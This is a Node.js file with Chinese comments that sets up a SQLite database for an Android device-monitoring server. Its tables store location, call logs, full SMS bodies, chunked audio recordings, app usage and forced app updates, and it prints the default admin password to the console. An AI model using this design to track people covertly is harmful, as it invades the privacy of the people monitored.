// SQLite 数据库初始化与连接
const Database = require('better-sqlite3');
const bcrypt = require('bcryptjs');
const config = require('./config');

const db = new Database(config.DB_PATH);
db.pragma('journal_mode = WAL');

// 初始化数据表
function initDB() {
  // 管理员用户表
  db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      password_hash TEXT NOT NULL,
      created_at TEXT DEFAULT (datetime('now'))
    );
  `);

  // 设备表
  db.exec(`
    CREATE TABLE IF NOT EXISTS devices (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_code TEXT UNIQUE NOT NULL,
      device_name TEXT,
      device_token TEXT,
      platform TEXT,
      model TEXT,
      os_version TEXT,
      app_version TEXT,
      status TEXT DEFAULT 'offline',
      last_seen_at TEXT,
      created_at TEXT DEFAULT (datetime('now'))
    );
  `);

  // 监控数据表（位置、电量、网络）
  db.exec(`
    CREATE TABLE IF NOT EXISTS monitor_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id INTEGER NOT NULL,
      latitude REAL,
      longitude REAL,
      accuracy REAL,
      altitude REAL,
      speed REAL,
      battery_level INTEGER,
      battery_charging INTEGER,
      battery_temperature REAL,
      network_type TEXT,
      network_strength INTEGER,
      extra TEXT,
      recorded_at TEXT NOT NULL,
      received_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
    );
  `);

  // 来电记录表（设备端上报来电号码与状态）
  db.exec(`
    CREATE TABLE IF NOT EXISTS phone_calls (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id INTEGER NOT NULL,
      phone_number TEXT,
      call_state TEXT,
      ring_started_at TEXT,
      answered_at TEXT,
      ended_at TEXT,
      duration_seconds INTEGER,
      extra TEXT,
      received_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
    );
  `);

  // 录音文件表（设备端实时分段上传的录音）
  db.exec(`
    CREATE TABLE IF NOT EXISTS audio_files (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id INTEGER NOT NULL,
      session_id TEXT NOT NULL,
      chunk_index INTEGER DEFAULT 0,
      file_path TEXT NOT NULL,
      file_url TEXT,
      file_size INTEGER,
      duration_seconds REAL,
      mime_type TEXT,
      received_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
    );
  `);

  // 短信记录表（设备端批量上报短信内容）
  db.exec(`
    CREATE TABLE IF NOT EXISTS sms_messages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id INTEGER NOT NULL,
      sms_id INTEGER,                                -- 设备端原始短信 ID（用于去重）
      address TEXT,                                  -- 对方号码
      body TEXT,                                     -- 短信正文
      type INTEGER DEFAULT 1,                        -- 1=收到 2=发出
      person_name TEXT,                              -- 联系人姓名
      read INTEGER DEFAULT 1,                        -- 0=未读 1=已读
      service_center TEXT,                           -- 短信中心号码
      received_at TEXT NOT NULL,                     -- 收发时间（设备端）
      created_at TEXT DEFAULT (datetime('now')),     -- 服务端接收时间
      FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
    );
  `);

  // 设备加入申请表 - 安卓端未激活时提交申请，管理端审批后生成 device_code/token
  db.exec(`
    CREATE TABLE IF NOT EXISTS join_requests (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      request_code TEXT UNIQUE NOT NULL,            -- 申请编号（设备端用于查询状态）
      device_name TEXT,                            -- 设备名称（用户可填）
      model TEXT,                                   -- 设备型号
      os_version TEXT,                              -- 系统版本
      app_version TEXT,                             -- 应用版本
      android_id TEXT,                              -- Settings.Secure.ANDROID_ID
      phone_number TEXT,                            -- 主号码（如有 READ_PHONE_STATE 权限）
      requester_name TEXT,                          -- 申请人姓名/备注
      contact TEXT,                                 -- 联系方式
      status TEXT DEFAULT 'pending',                -- pending / approved / rejected
      device_id INTEGER,                            -- 审批通过后关联的设备 ID
      review_comment TEXT,                          -- 审批备注
      reviewed_by TEXT,                             -- 审批人用户名
      reviewed_at TEXT,
      created_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE SET NULL
    );
  `);

  // 操作日志表 - 记录管理端的关键操作（审批、设备创建、删除等）便于审计
  db.exec(`
    CREATE TABLE IF NOT EXISTS operation_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER,                              -- 操作人 ID
      username TEXT,                               -- 操作人用户名（冗余，便于查询）
      action TEXT NOT NULL,                         -- 动作类型：approve_join / reject_join / create_device / delete_device 等
      target_type TEXT,                             -- 操作对象类型：join_request / device 等
      target_id INTEGER,                            -- 操作对象 ID
      detail TEXT,                                  -- 详细描述（JSON 字符串）
      created_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE SET NULL
    );
  `);

  // 应用使用日志表 - 设备端实时上报的前台/后台应用使用情况
  // 每次上报记录一批应用快照（前台切换或定时全量），便于管理端查看应用使用时间线
  db.exec(`
    CREATE TABLE IF NOT EXISTS app_usage_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id INTEGER NOT NULL,
      package_name TEXT NOT NULL,                   -- 应用包名
      app_label TEXT,                               -- 应用显示名称（如"微信"）
      version_name TEXT,                            -- 应用版本名
      is_foreground INTEGER DEFAULT 0,              -- 1=当前前台, 0=后台运行
      event_type TEXT,                              -- snapshot=定时快照, foreground_change=前台切换事件
      last_used_at INTEGER,                         -- 该应用最近活跃时间（毫秒时间戳）
      total_time_visible INTEGER,                   -- 该应用累计可见时长（毫秒，仅 snapshot 有意义）
      recorded_at TEXT NOT NULL,                    -- 设备端记录时间
      received_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
    );
  `);

  // App 版本发布表 - 管理端上传 APK 后写入记录，设备端启动时检查更新
  // is_active=1 的最新版本为当前生效版本；force_update=1 时设备端必须更新才能使用
  db.exec(`
    CREATE TABLE IF NOT EXISTS app_releases (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      version_code INTEGER NOT NULL,                -- 版本号（整数，用于比较大小）
      version_name TEXT NOT NULL,                   -- 版本名（如 "1.2.0"）
      file_path TEXT NOT NULL,                      -- APK 文件在服务器上的相对路径
      file_url TEXT,                                -- 下载 URL（拼好后端基地址）
      file_size INTEGER,                            -- 文件大小（字节）
      md5 TEXT,                                     -- MD5 校验和（可选，用于校验下载完整性）
      release_notes TEXT,                           -- 更新说明
      force_update INTEGER DEFAULT 0,               -- 是否强制更新（1=必须更新才能使用）
      is_active INTEGER DEFAULT 1,                  -- 是否启用（1=当前生效，0=历史版本）
      uploaded_by TEXT,                             -- 上传人用户名
      created_at TEXT DEFAULT (datetime('now')),
      UNIQUE(version_code)
    );
  `);

  // 创建索引以加速查询
  db.exec(`
    CREATE INDEX IF NOT EXISTS idx_monitor_device_time ON monitor_logs(device_id, recorded_at);
    CREATE INDEX IF NOT EXISTS idx_devices_status ON devices(status);
    CREATE INDEX IF NOT EXISTS idx_phone_calls_device_time ON phone_calls(device_id, received_at);
    CREATE INDEX IF NOT EXISTS idx_sms_device_time ON sms_messages(device_id, received_at);
    CREATE UNIQUE INDEX IF NOT EXISTS idx_sms_sms_id ON sms_messages(device_id, sms_id);
    CREATE INDEX IF NOT EXISTS idx_audio_device_session ON audio_files(device_id, session_id);
    CREATE INDEX IF NOT EXISTS idx_audio_received ON audio_files(received_at);
    CREATE INDEX IF NOT EXISTS idx_join_requests_status ON join_requests(status);
    CREATE INDEX IF NOT EXISTS idx_join_requests_code ON join_requests(request_code);
    CREATE INDEX IF NOT EXISTS idx_operation_logs_target ON operation_logs(target_type, target_id);
    CREATE INDEX IF NOT EXISTS idx_operation_logs_user ON operation_logs(user_id);
    CREATE INDEX IF NOT EXISTS idx_app_usage_device_time ON app_usage_logs(device_id, recorded_at);
    CREATE INDEX IF NOT EXISTS idx_app_usage_fg ON app_usage_logs(device_id, is_foreground, recorded_at);
    CREATE INDEX IF NOT EXISTS idx_app_releases_active ON app_releases(is_active, created_at DESC);
  `);

  // 初始化默认管理员账号
  const admin = db.prepare('SELECT id FROM users WHERE username = ?').get(config.DEFAULT_ADMIN.username);
  if (!admin) {
    const hash = bcrypt.hashSync(config.DEFAULT_ADMIN.password, 10);
    db.prepare('INSERT INTO users (username, password_hash) VALUES (?, ?)').run(config.DEFAULT_ADMIN.username, hash);
    console.log(`[DB] 已创建默认管理员账号: ${config.DEFAULT_ADMIN.username} / ${config.DEFAULT_ADMIN.password}`);
  }
}

initDB();

module.exports = db;
